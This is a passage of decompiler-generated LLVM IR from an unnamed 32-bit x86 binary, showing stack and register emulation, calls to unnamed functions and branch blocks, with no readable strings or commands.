  store i32 0, i32* %v2_8048f35, align 4
  %v1_8048f37 = add i32 %v1_8048f33, -16
  %v2_8048f37 = inttoptr i32 %v1_8048f37 to i32*
  store i32 45, i32* %v2_8048f37, align 4
  %v3_8048f39 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f39, i32* %eax.global-to-local, align 4
  %v0_8048f3e = load i32, i32* @esp, align 4
  %v9_8048f3e = icmp eq i32 %v0_8048f3e, -12
  store i1 %v9_8048f3e, i1* %zf.global-to-local, align 1
  %v2_8048f41 = add i32 %v0_8048f3e, 8
  %v3_8048f41 = inttoptr i32 %v2_8048f41 to i32*
  store i32 %v3_8048f39, i32* %v3_8048f41, align 4
  %v1_8048f42 = add i32 %v0_8048f3e, 120
  %v2_8048f42 = inttoptr i32 %v1_8048f42 to i32*
  %v3_8048f42 = load i32, i32* %v2_8048f42, align 4
  store i32 %v3_8048f42, i32* @edx, align 4
  %v2_8048f46 = add i32 %v0_8048f3e, 4
  %v3_8048f46 = inttoptr i32 %v2_8048f46 to i32*
  store i32 %v3_8048f42, i32* %v3_8048f46, align 4
  %v1_8048f47 = add i32 %v0_8048f3e, 147
  store i32 %v1_8048f47, i32* @ecx, align 4
  %v3_8048f4e = inttoptr i32 %v0_8048f3e to i32*
  store i32 %v1_8048f47, i32* %v3_8048f4e, align 4
  %v4_8048f4f = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f54 = load i32, i32* @esp, align 4
  %v1_8048f54 = add i32 %v0_8048f54, 16
  %v1_8048f57 = add i32 %v4_8048f4f, 1
  %v8_8048f57 = icmp eq i32 %v1_8048f57, 0
  store i1 %v8_8048f57, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f57, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f57, label %dec_label_pc_8048f64, label %dec_label_pc_8048f5a

dec_label_pc_8048f5a:                             ; preds = %dec_label_pc_8048f33
  %v1_8048f5a = add i32 %v0_8048f54, 108
  %v2_8048f5a = inttoptr i32 %v1_8048f5a to i32*
  %v3_8048f5a = load i32, i32* %v2_8048f5a, align 4
  store i32 %v3_8048f5a, i32* %eax.global-to-local, align 4
  %v1_8048f5e = inttoptr i32 %v3_8048f5a to i32*
  store i32 1, i32* %v1_8048f5e, align 4
  %v0_8048f64.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f64

dec_label_pc_8048f64:                             ; preds = %dec_label_pc_8048f33, %dec_label_pc_8048f5a
  %v0_8048f64 = phi i32 [ %v1_8048f54, %dec_label_pc_8048f33 ], [ %v0_8048f64.pre, %dec_label_pc_8048f5a ]
  %v1_8048f64 = add i32 %v0_8048f64, 92
  %v2_8048f64 = inttoptr i32 %v1_8048f64 to i32*
  %v3_8048f64 = load i32, i32* %v2_8048f64, align 4
  store i32 %v3_8048f64, i32* %edx.global-to-local, align 4
  %v1_8048f68 = add i32 %v3_8048f64, 4
  %v2_8048f68 = inttoptr i32 %v1_8048f68 to i32*
  store i32 0, i32* %v2_8048f68, align 4
  %v0_8048f6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8048f6f = load i32, i32* @esp, align 4
  %v2_8048f6f = add i32 %v1_8048f6f, -4
  %v3_8048f6f = inttoptr i32 %v2_8048f6f to i32*
  store i32 %v0_8048f6f, i32* %v3_8048f6f, align 4
  %v0_8048f70 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f70 = add i32 %v1_8048f6f, -8
  %v3_8048f70 = inttoptr i32 %v2_8048f70 to i32*
  store i32 %v0_8048f70, i32* %v3_8048f70, align 4
  %v1_8048f71 = add i32 %v1_8048f6f, -12
  %v2_8048f71 = inttoptr i32 %v1_8048f71 to i32*
  store i32 0, i32* %v2_8048f71, align 4
  %v1_8048f73 = add i32 %v1_8048f6f, -16
  %v2_8048f73 = inttoptr i32 %v1_8048f73 to i32*
  store i32 44, i32* %v2_8048f73, align 4
  %v3_8048f75 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f75, i32* %eax.global-to-local, align 4
  %v0_8048f7a = load i32, i32* @esp, align 4
  %v9_8048f7a = icmp eq i32 %v0_8048f7a, -12
  store i1 %v9_8048f7a, i1* %zf.global-to-local, align 1
  %v2_8048f7d = add i32 %v0_8048f7a, 8
  %v3_8048f7d = inttoptr i32 %v2_8048f7d to i32*
  store i32 %v3_8048f75, i32* %v3_8048f7d, align 4
  %v1_8048f7e = add i32 %v0_8048f7a, 120
  %v2_8048f7e = inttoptr i32 %v1_8048f7e to i32*
  %v3_8048f7e = load i32, i32* %v2_8048f7e, align 4
  store i32 %v3_8048f7e, i32* %eax.global-to-local, align 4
  %v2_8048f82 = add i32 %v0_8048f7a, 4
  %v3_8048f82 = inttoptr i32 %v2_8048f82 to i32*
  store i32 %v3_8048f7e, i32* %v3_8048f82, align 4
  %v1_8048f83 = add i32 %v0_8048f7a, 147
  store i32 %v1_8048f83, i32* @ecx, align 4
  %v3_8048f8a = inttoptr i32 %v0_8048f7a to i32*
  store i32 %v1_8048f83, i32* %v3_8048f8a, align 4
  %v4_8048f8b = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f90 = load i32, i32* @esp, align 4
  %v1_8048f90 = add i32 %v0_8048f90, 16
  %v1_8048f93 = add i32 %v4_8048f8b, 1
  %v8_8048f93 = icmp eq i32 %v1_8048f93, 0
  store i1 %v8_8048f93, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f93, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f93, label %dec_label_pc_8049044, label %dec_label_pc_8048f9a

dec_label_pc_8048f9a:                             ; preds = %dec_label_pc_8048f64
  %v2_8048f9a = add i32 %v0_8048f90, 12
  %v3_8048f9a = inttoptr i32 %v2_8048f9a to i32*
  store i32 %v1_8048f93, i32* %v3_8048f9a, align 4
  %v0_8048f9b = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f9b = add i32 %v0_8048f90, 8
  %v3_8048f9b = inttoptr i32 %v2_8048f9b to i32*
  store i32 %v0_8048f9b, i32* %v3_8048f9b, align 4
  %v1_8048f9c = add i32 %v0_8048f90, 4
  %v2_8048f9c = inttoptr i32 %v1_8048f9c to i32*
  store i32 0, i32* %v2_8048f9c, align 4
  %v2_8048f9e = inttoptr i32 %v0_8048f90 to i32*
  store i32 44, i32* %v2_8048f9e, align 4
  %v3_8048fa0 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048fa0, i32* %eax.global-to-local, align 4
  %v0_8048fa5 = load i32, i32* @esp, align 4
  %v9_8048fa5 = icmp eq i32 %v0_8048fa5, -12
  store i1 %v9_8048fa5, i1* %zf.global-to-local, align 1
  %v2_8048fa8 = add i32 %v0_8048fa5, 8
  %v3_8048fa8 = inttoptr i32 %v2_8048fa8 to i32*
  store i32 %v3_8048fa0, i32* %v3_8048fa8, align 4
  %v1_8048fa9 = add i32 %v0_8048fa5, 120
  %v2_8048fa9 = inttoptr i32 %v1_8048fa9 to i32*
  %v3_8048fa9 = load i32, i32* %v2_8048fa9, align 4
  %v2_8048fad = add i32 %v0_8048fa5, 4
  %v3_8048fad = inttoptr i32 %v2_8048fad to i32*
  store i32 %v3_8048fa9, i32* %v3_8048fad, align 4
  %v1_8048fae = add i32 %v0_8048fa5, 147
  store i32 %v1_8048fae, i32* %eax.global-to-local, align 4
  %v3_8048fb5 = inttoptr i32 %v0_8048fa5 to i32*
  store i32 %v1_8048fae, i32* %v3_8048fb5, align 4
  %v4_8048fb6 = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048fb6, i32* %eax.global-to-local, align 4
  %v0_8048fbb = load i32, i32* @esp, align 4
  %v6_8048fbb = icmp eq i32 %v0_8048fbb, -16
  store i1 %v6_8048fbb, i1* %zf.global-to-local, align 1
  store i32 %v4_8048fb6, i32* %ebx.global-to-local, align 4
  %v2_8048fc0 = add i32 %v4_8048fb6, 147
  %v3_8048fc0 = add i32 %v2_8048fc0, %v0_8048fbb
  %v4_8048fc0 = inttoptr i32 %v3_8048fc0 to i8*
  %v5_8048fc0 = load i8, i8* %v4_8048fc0, align 1
  %v11_8048fc0 = icmp eq i8 %v5_8048fc0, 32
  %v1_8048fc8 = zext i1 %v11_8048fc0 to i32
  %v1_8048fcb = add i32 %v0_8048fbb, 147
  store i32 %v1_8048fcb, i32* %esi.global-to-local, align 4
  store i32 %v1_8048fc8, i32* %eax.global-to-local, align 4
  %v1_8048fd7 = add i32 %v0_8048fbb, 12
  %v2_8048fd7 = inttoptr i32 %v1_8048fd7 to i32*
  store i32 2, i32* %v2_8048fd7, align 4
  %v1_8048fd9 = add i32 %v0_8048fbb, 8
  %v2_8048fd9 = inttoptr i32 %v1_8048fd9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_8048fd9, align 4
  %v0_8048fde = load i32, i32* %ebx.global-to-local, align 4
  %v1_8048fde = load i32, i32* %eax.global-to-local, align 4
  %v2_8048fde = add i32 %v1_8048fde, %v0_8048fde
  store i32 %v2_8048fde, i32* @ebx, align 4
  %v1_8048fe0 = add i32 %v0_8048fbb, 120
  %v2_8048fe0 = inttoptr i32 %v1_8048fe0 to i32*
  %v3_8048fe0 = load i32, i32* %v2_8048fe0, align 4
  %v2_8048fe4 = sub i32 %v3_8048fe0, %v2_8048fde
  store i32 %v2_8048fe4, i32* %eax.global-to-local, align 4
  %v0_8048fe6 = load i32, i32* %esi.global-to-local, align 4
  %v2_8048fe6 = add i32 %v0_8048fe6, %v2_8048fde
  %v12_8048fe6 = icmp eq i32 %v2_8048fe6, 0
  store i1 %v12_8048fe6, i1* %zf.global-to-local, align 1
  store i32 %v2_8048fe6, i32* @esi, align 4
  %v2_8048fe8 = add i32 %v0_8048fbb, 4
  %v3_8048fe8 = inttoptr i32 %v2_8048fe8 to i32*
  store i32 %v2_8048fe4, i32* %v3_8048fe8, align 4
  %v0_8048fe9 = load i32, i32* @esi, align 4
  %v3_8048fe9 = inttoptr i32 %v0_8048fbb to i32*
  store i32 %v0_8048fe9, i32* %v3_8048fe9, align 4
  %v0_8048fea = call i32 @function_8052690()
  store i32 %v0_8048fea, i32* %eax.global-to-local, align 4
  %v0_8048fef = load i32, i32* @esp, align 4
  %v1_8048fef = add i32 %v0_8048fef, 16
  store i32 %v0_8048fea, i32* %edx.global-to-local, align 4
  %v10_8048ff4 = icmp eq i32 %v0_8048fea, -1
  store i1 %v10_8048ff4, i1* %zf.global-to-local, align 1
  br i1 %v10_8048ff4, label %dec_label_pc_8049044, label %dec_label_pc_8048ff9

dec_label_pc_8048ff9:                             ; preds = %dec_label_pc_8048f9a
  %v10_8048ff9 = icmp eq i32 %v0_8048fea, 1
  store i1 %v10_8048ff9, i1* %zf.global-to-local, align 1
  %v7_8048ffc = icmp sgt i32 %v0_8048fea, 1
  br i1 %v7_8048ffc, label %dec_label_pc_8048ffe, label %dec_label_pc_8049001

dec_label_pc_8048ffe:                             ; preds = %dec_label_pc_8048ff9
  %v1_8048ffe = add i32 %v0_8048fea, -2
  %v9_8048ffe = icmp eq i32 %v1_8048ffe, 0
  store i1 %v9_8048ffe, i1* %zf.global-to-local, align 1
  store i32 %v1_8048ffe, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049001

dec_label_pc_8049001:                             ; preds = %dec_label_pc_8048ff9, %dec_label_pc_8048ffe
  %v1_804900a = phi i32 [ %v0_8048fea, %dec_label_pc_8048ff9 ], [ %v1_8048ffe, %dec_label_pc_8048ffe ]
  %v1_8049001 = add i32 %v0_8048fef, 20920
  %v1_8049008 = load i32, i32* @ebx, align 4
  %v2_8049008 = add i32 %v1_8049001, %v1_8049008
  %v12_8049008 = icmp eq i32 %v2_8049008, 0
  store i1 %v12_8049008, i1* %zf.global-to-local, align 1
  store i32 %v2_8049008, i32* %eax.global-to-local, align 4
  %v2_804900a = add i32 %v1_804900a, -20773
  %v3_804900a = add i32 %v2_804900a, %v2_8049008
  %v4_804900a = inttoptr i32 %v3_804900a to i8*
  store i8 0, i8* %v4_804900a, align 1
  %v0_8049012 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049012 = load i32, i32* @esp, align 4
  %v2_8049012 = add i32 %v1_8049012, -4
  %v3_8049012 = inttoptr i32 %v2_8049012 to i32*
  store i32 %v0_8049012, i32* %v3_8049012, align 4
  %v0_8049013 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049013 = add i32 %v1_8049012, -8
  %v3_8049013 = inttoptr i32 %v2_8049013 to i32*
  store i32 %v0_8049013, i32* %v3_8049013, align 4
  %v1_8049014 = add i32 %v1_8049012, -12
  %v2_8049014 = inttoptr i32 %v1_8049014 to i32*
  store i32 0, i32* %v2_8049014, align 4
  %v1_8049016 = add i32 %v1_8049012, -16
  %v2_8049016 = inttoptr i32 %v1_8049016 to i32*
  store i32 43, i32* %v2_8049016, align 4
  %v3_8049018 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049018, i32* %eax.global-to-local, align 4
  %v0_804901d = load i32, i32* @esi, align 4
  %v1_804901d = load i32, i32* @esp, align 4
  %v2_804901d = inttoptr i32 %v1_804901d to i32*
  store i32 %v0_804901d, i32* %v2_804901d, align 4
  store i32 %v3_8049018, i32* @ebx, align 4
  %v2_8049022 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049022, i32* %eax.global-to-local, align 4
  %v0_8049027 = load i32, i32* @esp, align 4
  %v9_8049027 = icmp eq i32 %v0_8049027, -12
  store i1 %v9_8049027, i1* %zf.global-to-local, align 1
  %v0_804902a = load i32, i32* @ebx, align 4
  %v2_804902a = add i32 %v0_8049027, 8
  %v3_804902a = inttoptr i32 %v2_804902a to i32*
  store i32 %v0_804902a, i32* %v3_804902a, align 4
  %v2_804902b = add i32 %v0_8049027, 4
  %v3_804902b = inttoptr i32 %v2_804902b to i32*
  store i32 %v2_8049022, i32* %v3_804902b, align 4
  %v0_804902c = load i32, i32* @esi, align 4
  %v3_804902c = inttoptr i32 %v0_8049027 to i32*
  store i32 %v0_804902c, i32* %v3_804902c, align 4
  %v4_804902d = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804902d, i32* %eax.global-to-local, align 4
  %v0_8049032 = load i32, i32* @esp, align 4
  %v1_8049032 = add i32 %v0_8049032, 16
  %v1_8049035 = icmp eq i32 %v4_804902d, 0
  store i1 %v1_8049035, i1* %zf.global-to-local, align 1
  br i1 %v1_8049035, label %dec_label_pc_8049044, label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8049001
  %v1_8049039 = add i32 %v0_8049032, 108
  %v2_8049039 = inttoptr i32 %v1_8049039 to i32*
  %v3_8049039 = load i32, i32* %v2_8049039, align 4
  store i32 %v3_8049039, i32* %edx.global-to-local, align 4
  %v1_804903d = add i32 %v3_8049039, 4
  %v2_804903d = inttoptr i32 %v1_804903d to i32*
  store i32 1, i32* %v2_804903d, align 4
  %v0_8049044.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049044

dec_label_pc_8049044:                             ; preds = %dec_label_pc_8049001, %dec_label_pc_8048f9a, %dec_label_pc_8048f64, %dec_label_pc_8049039
  %v0_8049044 = phi i32 [ %v1_8049032, %dec_label_pc_8049001 ], [ %v1_8048fef, %dec_label_pc_8048f9a ], [ %v1_8048f90, %dec_label_pc_8048f64 ], [ %v0_8049044.pre, %dec_label_pc_8049039 ]
  %v1_8049044 = add i32 %v0_8049044, 92
  %v2_8049044 = inttoptr i32 %v1_8049044 to i32*
  %v3_8049044 = load i32, i32* %v2_8049044, align 4
  store i32 %v3_8049044, i32* %ecx.global-to-local, align 4
  %v1_8049048 = add i32 %v3_8049044, 8
  %v2_8049048 = inttoptr i32 %v1_8049048 to i32*
  store i32 0, i32* %v2_8049048, align 4
  %v0_804904f = load i32, i32* %eax.global-to-local, align 4
  %v1_804904f = load i32, i32* @esp, align 4
  %v2_804904f = add i32 %v1_804904f, -4
  %v3_804904f = inttoptr i32 %v2_804904f to i32*
  store i32 %v0_804904f, i32* %v3_804904f, align 4
  %v0_8049050 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049050 = add i32 %v1_804904f, -8
  %v3_8049050 = inttoptr i32 %v2_8049050 to i32*
  store i32 %v0_8049050, i32* %v3_8049050, align 4
  %v1_8049051 = add i32 %v1_804904f, -12
  %v2_8049051 = inttoptr i32 %v1_8049051 to i32*
  store i32 0, i32* %v2_8049051, align 4
  %v1_8049053 = add i32 %v1_804904f, -16
  %v2_8049053 = inttoptr i32 %v1_8049053 to i32*
  store i32 41, i32* %v2_8049053, align 4
  %v3_8049055 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049055, i32* %eax.global-to-local, align 4
  %v0_804905a = load i32, i32* @esp, align 4
  %v9_804905a = icmp eq i32 %v0_804905a, -12
  store i1 %v9_804905a, i1* %zf.global-to-local, align 1
  %v2_804905d = add i32 %v0_804905a, 8
  %v3_804905d = inttoptr i32 %v2_804905d to i32*
  store i32 %v3_8049055, i32* %v3_804905d, align 4
  %v1_804905e = add i32 %v0_804905a, 120
  %v2_804905e = inttoptr i32 %v1_804905e to i32*
  %v3_804905e = load i32, i32* %v2_804905e, align 4
  %v2_8049062 = add i32 %v0_804905a, 4
  %v3_8049062 = inttoptr i32 %v2_8049062 to i32*
  store i32 %v3_804905e, i32* %v3_8049062, align 4
  %v1_8049063 = add i32 %v0_804905a, 147
  store i32 %v1_8049063, i32* %eax.global-to-local, align 4
  %v3_804906a = inttoptr i32 %v0_804905a to i32*
  store i32 %v1_8049063, i32* %v3_804906a, align 4
  %v4_804906b = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049070 = load i32, i32* @esp, align 4
  %v1_8049070 = add i32 %v0_8049070, 16
  %v1_8049073 = add i32 %v4_804906b, 1
  %v8_8049073 = icmp eq i32 %v1_8049073, 0
  store i1 %v8_8049073, i1* %zf.global-to-local, align 1
  store i32 %v1_8049073, i32* %eax.global-to-local, align 4
  br i1 %v8_8049073, label %dec_label_pc_8049124, label %dec_label_pc_804907a

dec_label_pc_804907a:                             ; preds = %dec_label_pc_8049044
  %v0_804907a = load i32, i32* @edi, align 4
  %v2_804907a = add i32 %v0_8049070, 12
  %v3_804907a = inttoptr i32 %v2_804907a to i32*
  store i32 %v0_804907a, i32* %v3_804907a, align 4
  %v0_804907b = load i32, i32* @edi, align 4
  %v2_804907b = add i32 %v0_8049070, 8
  %v3_804907b = inttoptr i32 %v2_804907b to i32*
  store i32 %v0_804907b, i32* %v3_804907b, align 4
  %v1_804907c = add i32 %v0_8049070, 4
  %v2_804907c = inttoptr i32 %v1_804907c to i32*
  store i32 0, i32* %v2_804907c, align 4
  %v2_804907e = inttoptr i32 %v0_8049070 to i32*
  store i32 41, i32* %v2_804907e, align 4
  %v3_8049080 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049080, i32* %eax.global-to-local, align 4
  %v0_8049085 = load i32, i32* @esp, align 4
  %v9_8049085 = icmp eq i32 %v0_8049085, -12
  store i1 %v9_8049085, i1* %zf.global-to-local, align 1
  %v2_8049088 = add i32 %v0_8049085, 8
  %v3_8049088 = inttoptr i32 %v2_8049088 to i32*
  store i32 %v3_8049080, i32* %v3_8049088, align 4
  %v1_8049089 = add i32 %v0_8049085, 120
  %v2_8049089 = inttoptr i32 %v1_8049089 to i32*
  %v3_8049089 = load i32, i32* %v2_8049089, align 4
  %v2_804908d = add i32 %v0_8049085, 4
  %v3_804908d = inttoptr i32 %v2_804908d to i32*
  store i32 %v3_8049089, i32* %v3_804908d, align 4
  %v1_804908e = add i32 %v0_8049085, 147
  store i32 %v1_804908e, i32* @edx, align 4
  %v3_8049095 = inttoptr i32 %v0_8049085 to i32*
  store i32 %v1_804908e, i32* %v3_8049095, align 4
  %v4_8049096 = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049096, i32* %eax.global-to-local, align 4
  %v0_804909b = load i32, i32* @esp, align 4
  %v6_804909b = icmp eq i32 %v0_804909b, -16
  store i1 %v6_804909b, i1* %zf.global-to-local, align 1
  store i32 %v4_8049096, i32* %ebx.global-to-local, align 4
  %v2_80490a0 = add i32 %v4_8049096, 147
  %v3_80490a0 = add i32 %v2_80490a0, %v0_804909b
  %v4_80490a0 = inttoptr i32 %v3_80490a0 to i8*
  %v5_80490a0 = load i8, i8* %v4_80490a0, align 1
  %v11_80490a0 = icmp eq i8 %v5_80490a0, 32
  %v1_80490a8 = zext i1 %v11_80490a0 to i32
  %v1_80490ab = add i32 %v0_804909b, 147
  store i32 %v1_80490ab, i32* %esi.global-to-local, align 4
  store i32 %v1_80490a8, i32* %eax.global-to-local, align 4
  %v1_80490b7 = add i32 %v0_804909b, 12
  %v2_80490b7 = inttoptr i32 %v1_80490b7 to i32*
  store i32 2, i32* %v2_80490b7, align 4
  %v1_80490b9 = add i32 %v0_804909b, 8
  %v2_80490b9 = inttoptr i32 %v1_80490b9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_80490b9, align 4
  %v0_80490be = load i32, i32* %ebx.global-to-local, align 4
  %v1_80490be = load i32, i32* %eax.global-to-local, align 4
  %v2_80490be = add i32 %v1_80490be, %v0_80490be
  store i32 %v2_80490be, i32* @ebx, align 4
  %v1_80490c0 = add i32 %v0_804909b, 120
  %v2_80490c0 = inttoptr i32 %v1_80490c0 to i32*
  %v3_80490c0 = load i32, i32* %v2_80490c0, align 4
  %v2_80490c4 = sub i32 %v3_80490c0, %v2_80490be
  store i32 %v2_80490c4, i32* %eax.global-to-local, align 4
  %v0_80490c6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80490c6 = add i32 %v0_80490c6, %v2_80490be
  %v12_80490c6 = icmp eq i32 %v2_80490c6, 0
  store i1 %v12_80490c6, i1* %zf.global-to-local, align 1
  store i32 %v2_80490c6, i32* @esi, align 4
  %v2_80490c8 = add i32 %v0_804909b, 4
  %v3_80490c8 = inttoptr i32 %v2_80490c8 to i32*
  store i32 %v2_80490c4, i32* %v3_80490c8, align 4
  %v0_80490c9 = load i32, i32* @esi, align 4
  %v3_80490c9 = inttoptr i32 %v0_804909b to i32*
  store i32 %v0_80490c9, i32* %v3_80490c9, align 4
  %v0_80490ca = call i32 @function_8052690()
  store i32 %v0_80490ca, i32* %eax.global-to-local, align 4
  %v0_80490cf = load i32, i32* @esp, align 4
  %v1_80490cf = add i32 %v0_80490cf, 16
  store i32 %v0_80490ca, i32* %edx.global-to-local, align 4
  %v10_80490d4 = icmp eq i32 %v0_80490ca, -1
  store i1 %v10_80490d4, i1* %zf.global-to-local, align 1
  br i1 %v10_80490d4, label %dec_label_pc_8049124, label %dec_label_pc_80490d9

dec_label_pc_80490d9:                             ; preds = %dec_label_pc_804907a
  %v10_80490d9 = icmp eq i32 %v0_80490ca, 1
  store i1 %v10_80490d9, i1* %zf.global-to-local, align 1
  %v7_80490dc = icmp sgt i32 %v0_80490ca, 1
  br i1 %v7_80490dc, label %dec_label_pc_80490de, label %dec_label_pc_80490e1

dec_label_pc_80490de:                             ; preds = %dec_label_pc_80490d9
  %v1_80490de = add i32 %v0_80490ca, -2
  %v9_80490de = icmp eq i32 %v1_80490de, 0
  store i1 %v9_80490de, i1* %zf.global-to-local, align 1
  store i32 %v1_80490de, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80490e1

dec_label_pc_80490e1:                             ; preds = %dec_label_pc_80490d9, %dec_label_pc_80490de
  %v1_80490ea = phi i32 [ %v0_80490ca, %dec_label_pc_80490d9 ], [ %v1_80490de, %dec_label_pc_80490de ]
  %v1_80490e1 = add i32 %v0_80490cf, 20920
  %v1_80490e8 = load i32, i32* @ebx, align 4
  %v2_80490e8 = add i32 %v1_80490e1, %v1_80490e8
  %v12_80490e8 = icmp eq i32 %v2_80490e8, 0
  store i1 %v12_80490e8, i1* %zf.global-to-local, align 1
  store i32 %v2_80490e8, i32* %eax.global-to-local, align 4
  %v2_80490ea = add i32 %v1_80490ea, -20773
  %v3_80490ea = add i32 %v2_80490ea, %v2_80490e8
  %v4_80490ea = inttoptr i32 %v3_80490ea to i8*
  store i8 0, i8* %v4_80490ea, align 1
  %v0_80490f2 = load i32, i32* @ebx, align 4
  %v1_80490f2 = load i32, i32* @esp, align 4
  %v2_80490f2 = add i32 %v1_80490f2, -4
  %v3_80490f2 = inttoptr i32 %v2_80490f2 to i32*
  store i32 %v0_80490f2, i32* %v3_80490f2, align 4
  %v0_80490f3 = load i32, i32* @ebx, align 4
  %v2_80490f3 = add i32 %v1_80490f2, -8
  %v3_80490f3 = inttoptr i32 %v2_80490f3 to i32*
  store i32 %v0_80490f3, i32* %v3_80490f3, align 4
  %v1_80490f4 = add i32 %v1_80490f2, -12
  %v2_80490f4 = inttoptr i32 %v1_80490f4 to i32*
  store i32 0, i32* %v2_80490f4, align 4
  %v1_80490f6 = add i32 %v1_80490f2, -16
  %v2_80490f6 = inttoptr i32 %v1_80490f6 to i32*
  store i32 42, i32* %v2_80490f6, align 4
  %v3_80490f8 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80490f8, i32* %eax.global-to-local, align 4
  %v0_80490fd = load i32, i32* @esi, align 4
  %v1_80490fd = load i32, i32* @esp, align 4
  %v2_80490fd = inttoptr i32 %v1_80490fd to i32*
  store i32 %v0_80490fd, i32* %v2_80490fd, align 4
  store i32 %v3_80490f8, i32* @ebx, align 4
  %v2_8049102 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049102, i32* %eax.global-to-local, align 4
  %v0_8049107 = load i32, i32* @esp, align 4
  %v9_8049107 = icmp eq i32 %v0_8049107, -12
  store i1 %v9_8049107, i1* %zf.global-to-local, align 1
  %v0_804910a = load i32, i32* @ebx, align 4
  %v2_804910a = add i32 %v0_8049107, 8
  %v3_804910a = inttoptr i32 %v2_804910a to i32*
  store i32 %v0_804910a, i32* %v3_804910a, align 4
  %v2_804910b = add i32 %v0_8049107, 4
  %v3_804910b = inttoptr i32 %v2_804910b to i32*
  store i32 %v2_8049102, i32* %v3_804910b, align 4
  %v0_804910c = load i32, i32* @esi, align 4
  %v3_804910c = inttoptr i32 %v0_8049107 to i32*
  store i32 %v0_804910c, i32* %v3_804910c, align 4
  %v4_804910d = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804910d, i32* %eax.global-to-local, align 4
  %v0_8049112 = load i32, i32* @esp, align 4
  %v1_8049112 = add i32 %v0_8049112, 16
  %v1_8049115 = icmp eq i32 %v4_804910d, 0
  store i1 %v1_8049115, i1* %zf.global-to-local, align 1
  br i1 %v1_8049115, label %dec_label_pc_8049124, label %dec_label_pc_8049119

dec_label_pc_8049119:                             ; preds = %dec_label_pc_80490e1
  %v1_8049119 = add i32 %v0_8049112, 108
  %v2_8049119 = inttoptr i32 %v1_8049119 to i32*
  %v3_8049119 = load i32, i32* %v2_8049119, align 4
  store i32 %v3_8049119, i32* @ecx, align 4
  %v1_804911d = add i32 %v3_8049119, 8
  %v2_804911d = inttoptr i32 %v1_804911d to i32*
  store i32 1, i32* %v2_804911d, align 4
  %v1_8049124.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049124

dec_label_pc_8049124:                             ; preds = %dec_label_pc_8049044, %dec_label_pc_80490e1, %dec_label_pc_804907a, %dec_label_pc_8049119
  %v1_8049124 = phi i32 [ %v1_8049070, %dec_label_pc_8049044 ], [ %v1_8049112, %dec_label_pc_80490e1 ], [ %v1_80490cf, %dec_label_pc_804907a ], [ %v1_8049124.pre, %dec_label_pc_8049119 ]
  %v0_8049124 = load i32, i32* @ecx, align 4
  %v2_8049124 = add i32 %v1_8049124, -4
  %v3_8049124 = inttoptr i32 %v2_8049124 to i32*
  store i32 %v0_8049124, i32* %v3_8049124, align 4
  %v0_8049125 = load i32, i32* @ecx, align 4
  %v2_8049125 = add i32 %v1_8049124, -8
  %v3_8049125 = inttoptr i32 %v2_8049125 to i32*
  store i32 %v0_8049125, i32* %v3_8049125, align 4
  %v1_8049126 = add i32 %v1_8049124, -12
  %v2_8049126 = inttoptr i32 %v1_8049126 to i32*
  store i32 0, i32* %v2_8049126, align 4
  %v1_8049128 = add i32 %v1_8049124, -16
  %v2_8049128 = inttoptr i32 %v1_8049128 to i32*
  store i32 40, i32* %v2_8049128, align 4
  %v3_804912a = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804912a, i32* %eax.global-to-local, align 4
  %v0_804912f = load i32, i32* @esp, align 4
  %v9_804912f = icmp eq i32 %v0_804912f, -12
  store i1 %v9_804912f, i1* %zf.global-to-local, align 1
  %v2_8049132 = add i32 %v0_804912f, 8
  %v3_8049132 = inttoptr i32 %v2_8049132 to i32*
  store i32 %v3_804912a, i32* %v3_8049132, align 4
  %v1_8049133 = add i32 %v0_804912f, 120
  %v2_8049133 = inttoptr i32 %v1_8049133 to i32*
